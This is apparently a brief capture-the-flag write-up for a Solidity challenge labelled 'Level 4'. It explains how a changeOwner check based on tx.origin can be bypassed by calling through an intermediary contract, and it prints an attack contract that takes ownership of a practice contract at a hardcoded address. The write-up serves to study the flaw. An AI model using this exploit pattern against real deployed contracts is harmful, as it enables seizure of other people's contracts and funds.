# Level 4

Reading the contract shows that if another contract's owner calls the changeOwner function, it would own the contract
So, using remix ide, I created an ownTelephone contract and with a contractor, owned the contract upon deploying the contract 


pragma solidity ^0.4.18;

contract Telephone {

  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

contract ownTelephone {
    Telephone tel = Telephone(0x40a00A01b2e47caa6d5D613C0f589AaEd1D5F9CC);
    constructor () public {
        tel.changeOwner(msg.sender);
    }
}
